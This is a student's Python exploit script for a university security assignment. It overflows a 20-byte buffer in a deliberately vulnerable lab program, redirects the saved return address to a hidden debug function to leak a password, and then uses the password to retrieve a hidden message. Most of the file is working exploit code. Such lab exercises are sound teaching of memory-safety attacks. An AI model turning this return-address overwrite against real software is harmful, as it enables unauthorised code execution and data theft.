
# Benny Liang | UCID: 30192142 | Assignment 3

"""
TASK 7 solution explanation
========================================================================

### how I found the vulnerability
* I analyzed the vulnerable program's source code `task7-vuln.c` and found that I can retrieve
    sensative information about the addresses of the following; debug_unused(), buff[20], and `rip` and `rdp` registers, 
    from debug statements when the environment variable `:)` exists.
* Having the above information I can then overflow the `buff[20]` and change the return address stored in the `rip` 
    register to debug_unused() function's return address.

### how the script works
* I used `pexpect.popen_spawn.PopenSpawn` to start and to interact with the vulnerable program
* I started the vulnerable executable with a wrapper function `color_spawn()`, which calls `pexpect.popen_spawn.PopenSpawn`,
    set the environment variable `:)=1` (make it exist) and used the debug statements to obtain the addresses of registers,
    `rip` and `rdp`, along with the addresses of `buff[20]` and the function debug_unused(). 
    I then compute the offset from `buff[20]` to the `rip` register.
* I then make the payload to overflow the `buff[20]` and overwrite (replace) the stored address in register `rip` with
    the address of the function debug_unused().
* I start the vulnerable program again and send in the payload.
* I extract the password from debug_unused()'s output.
* I start the vulnerable program once again and send in the obtained password and retrieve the hidden message. 
"""

import os
import sys
from pexpect import popen_spawn
import pexpect

import struct

# debugging output controlled via DEBUG environment variable
DEBUG = os.environ.get("DEBUG", "0") in ["1", "color"]
DEBUG_COLOR = os.environ.get("DEBUG", "0").lower() == "color"


class ColoredLog:
    """A pexpect logfile that adds color to output."""

    def __init__(self, color="1;34"):
        self.prefix = f"\033[{color}m".encode("ascii") if DEBUG_COLOR else b""
        self.suffix = b"\033[0m" if DEBUG_COLOR else b""

    def write(self, s: bytes):
        """write() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.write(self.prefix)
            # convert s to string but escape non-printable characters with backslash escapes
            ss = ""
            for c in s:
                if chr(c) in "\\":  # escape backslash and brackets
                    ss += "\\" + chr(c)
                elif (c >= 32 and c <= 126) or (chr(c) in "\n\t"):
                    ss += chr(c)
                else:
                    ss += f"\\{c:02x}"
            sys.stdout.buffer.write(ss.encode("ascii"))
            sys.stdout.buffer.write(self.suffix)

    def flush(self):
        """flush() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.flush()


def color_spawn(*args, **kwargs):
    """wrapper for pexpect.popen_spawn.PopenSpawn() and attaching a logger"""
    p = popen_spawn.PopenSpawn(*args, **kwargs)
    p.logfile_read = ColoredLog("1;34")
    p.logfile_send = ColoredLog("1;32")
    return p


def get_buff_offset(execname):
    '''
    Computes the `buff` offset from the register `rip` using the simulated gdb output, once the environment variable
    `:)` exists (it is removed after).
    Returns a tuple, first: buff offset from `rip`, second: debug_unused() address, in hexadecimal
    '''
    os.environ[":)"] = "1"  # make the environment variable exist
        
    # start the vulnerable program
    # since popen() is not using pty, we need to use stdbuf(1)
    # to disable output buffering
    process = color_spawn(f"stdbuf -o0 {execname}", timeout=10)
    
    # Get simulated gdb output of `&rbp` and `&rip`
    process.expect_exact("DEBUG:   Saved registers:\n")
    process.expect_exact("DEBUG: (gdb) print/x &buff\n")
    gdb_out1 = process.before.decode("ascii").rstrip().replace(",", "")
    
    process.expect_exact("DEBUG: (gdb) end\n")
    gdb_out2 = process.before.decode("ascii").rstrip()
    
    # filter out the addresses of registers `rbp` and `rip`
    filter1 = gdb_out1.split()
    rbp_adr = filter1[3]
    rip_adr = filter1[len(filter1) - 1]
    
    # filter out the addresses of `buff` and `debug_unused()`
    filter2 = gdb_out2.split()
    buff_adr = filter2[3]
    debug_unused_adr = filter2[len(filter2) - 1]
    
    # compute the `buff` offsets
    buff_offset_to_rip = int(rip_adr, 16) - int(buff_adr, 16)    
    buff_offset_to_rbp = int(rbp_adr, 16) - int(buff_adr, 16)
    offset = int(rip_adr, 16) - int(rbp_adr, 16)
    
    # debug
    # process2 = color_spawn(f"stdbuf -o0 {execname}", timeout=10)
    # process2.expect_exact("DEBUG: simulated gdb's output\n")
    # process2.expect_exact("DEBUG: (gdb) end\n")
    # fulloutput = process2.before.decode("ascii").rstrip()
    # print(f"---full output: \n{fulloutput}\n---")
    # print(f"---gdb out1: \n{gdb_out1}\n---")
    # print(f"---gdb out12: \n{gdb_out2}\n---")
    
    # print(f"---filter1: \n{filter1}\n---")
    # print(f"---filter2: \n{filter2}\n---")
    
    # print(f"---rbp_adr: \n{rbp_adr}\n---")
    # print(f"---rip_adr: \n{rip_adr}\n---")
    
    # print(f"---buff_adr: \n{buff_adr}\n---")
    # print(f"---debug_unused_adr: \n{debug_unused_adr}\n---")

    # print(f"---buff_offset to `rip`: \n{buff_offset_to_rip}\n---")
    # print(f"---buff_offset to `rdp`: \n{buff_offset_to_rbp}\n---")

    # print(f"---`rip` to `rdp` offset: \n{offset}\n---")
    
    del os.environ[":)"]    # remove the environment variable
    process.kill(True)
    
    return (buff_offset_to_rip, debug_unused_adr)
    


def main(execname):
    """exploit the vulnerable executable using pexpect"""

    try:
        # compute the buffer offset and debug_unused() address
        buff_offset_to_rip, debug_unused_adr = get_buff_offset(execname)
        debug_addr = int(debug_unused_adr, 16)  # convert hexadecimal to int
        
        # debug
        # print(f"---buff offset to `rip` register: `{buff_offset_to_rip}`\n---debug_unused_adr: `{debug_unused_adr}`") 
        # print(f"debug_addr to int: {debug_addr}")   
                
        # Create the payload to over flow the buffer where we will replace
        # the `rip` register's stored address to the address of the debug_unused() function.
        overflow = b"A" * buff_offset_to_rip + struct.pack("<Q", debug_addr)
            # (b"A" * buff_offset_to_rip): over flow the buffer (with some arbitrary value) until we reach the address start of the `rip` register
            # (+ struct.pack("<Q", debug_addr)) : add our address (`debug_addr`) we will be overwriting `rip` register with (written in little endian order)
                
        # debug
        # print(f"overflow (bytes): `{overflow}`")    
        # print(f"overflow (bytes) length: `{len(overflow)}`")    
        
        # extract the password
        # start the vulnerable program
        # since popen() is not using pty, we need to use stdbuf(1)
        # to disable output buffering
        process = color_spawn(f"stdbuf -o0 {execname}", timeout=10)
        
        # wait for the password prompt
        process.expect_exact("Password:")
        process.sendline(overflow)          # send in the overflow
        
        # recover the password that the debug_unused() function printed out for us
        process.expect_exact("Wrong password.\n")
        process.expect(pexpect.EOF, timeout=10)
        debug_unsued_output = process.before.decode("ascii").rstrip()
        
        # print(f"password line retrieved: `{debug_unsued_output}`") # debug
        
        # get the password from the debug_unused() function's output
        password = debug_unsued_output.replace("'", "").split()[2]
        
        # print(f"password: `{password}`")    # debug
        
        process.kill(True)
        
        
        # start the vulnerable program
        # since popen() is not using pty, we need to use stdbuf(1)
        # to disable output buffering
        process = color_spawn(f"stdbuf -o0 {execname}", timeout=10)
        process.expect_exact("Password:")
        process.sendline(password)
        
        # recover the hidden message
        # notice that with popen_spawn we can use \n line endings
        process.expect_exact("-----BEGIN HIDDEN MESSAGE-----\n")
        process.expect_exact("-----END HIDDEN MESSAGE-----")
        hidden_message = process.before.decode("ascii").rstrip()
        # optional: read the remaining output of the program one line at a time until <EOF>
        process.expect(pexpect.EOF, timeout=10)

        # print out the recovered hidden message
        print("Recovered hidden message:", hidden_message)
        process.kill(True)

    except Exception:  # pylint: disable=broad-except
        print("Exploit failed.")
        if DEBUG:
            raise


if __name__ == "__main__":
    main(sys.argv[1])
